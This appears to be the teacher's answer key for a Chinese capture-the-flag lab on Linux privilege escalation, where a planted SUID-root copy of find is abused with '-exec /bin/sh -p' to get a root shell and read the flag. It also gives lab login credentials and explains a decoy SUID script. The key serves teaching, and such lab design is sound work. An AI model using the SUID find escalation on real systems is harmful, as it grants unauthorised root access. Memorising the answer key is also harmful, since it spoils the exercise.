# 第 1 题（教师版）：SUID 的“老实人”

> **唯一提权面**：`/usr/local/bin/find`（SUID root，因此以 root 身份执行）
> **唯一解**：利用 `find` 的 `-exec` 参数执行 `/bin/sh -p`
> **干扰项**：`/usr/local/bin/healthcheck`（SUID 脚本，内核忽略脚本的 setuid 位，不可利用）

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 `Ly_Flag{8位}` |
| `/usr/local/bin/find` | `root:root 4755`（SUID） | `find` 的副本，唯一提权面 |
| `/usr/local/bin/healthcheck` | `root:root 4755` | 干扰项：SUID 加在脚本上，无效 |
| `/srv/www/uploads/` | 正常 | 场景素材 |

低权用户 `player` / 密码 `Player@2026`，无 sudo 权限，不在任何特权组。

## 二、唯一解（标准步骤）

```bash
# 1. 收集：找 SUID
find / -perm -4000 -type f 2>/dev/null
#   /usr/local/bin/find
#   /usr/local/bin/healthcheck
#   /usr/bin/passwd /usr/bin/su ...（系统自带，dpkg -V 可确认未被篡改）

# 2. 确认它是“后来放上去的”
ls -la /usr/local/bin/          # find 的 mtime 是 2024-03
dpkg -V find                    # 无输出（说明系统自带的 find 未被改），而副本在 /usr/local

# 3. 利用：find 的 -exec 以 root 身份执行命令
/usr/local/bin/find . -exec /bin/sh -p \; -quit
# 或：/usr/local/bin/find / -maxdepth 0 -exec cat /flag.txt \;

# 4. 验证
id                              # uid=0(root)
cat /flag.txt
```

### 关键点讲解

- **为什么必须 `-p`**：bash 检测到 `euid != ruid` 时会自动降回真实 uid（`bash --help` 里的
  `-p` 选项：privileged mode）。不加 `-p`，`id` 仍是 `player`。
- **`find . -exec ... \; -quit`** 中 `-quit` 是防止 find 继续遍历，节省时间。
- GTFOBins（https://gtfobins.github.io/）收录了所有“合法程序 → shell”的用法，`find` 在列。

## 三、干扰项说明（防止误判）

`/usr/local/bin/healthcheck` 是 SUID 脚本：

```bash
./healthcheck              # 能执行，但 id 仍是 player
```

原因：**Linux 内核对 `#!` 脚本忽略 setuid 位**（只有解释器二进制本身带 SUID 才生效）。
学生若试了这一步，会学到“SUID 只对二进制有效”这个知识点——这正是设计意图。

## 四、单解验证方法

在容器内以 `player` 身份执行：

```bash
# 正向：成功
/usr/local/bin/find . -exec /bin/sh -p \; -quit
id              # uid=0
cat /flag.txt   # 输出 Ly_Flag{...}

# 负向：以下路径必须全部失败（id 仍为 player）
./healthcheck                     # SUID 脚本无效
sudo -l                           # player is not in the sudoers file
find / -perm 4000 2>/dev/null | grep -v local   # 无其他异常 SUID
```
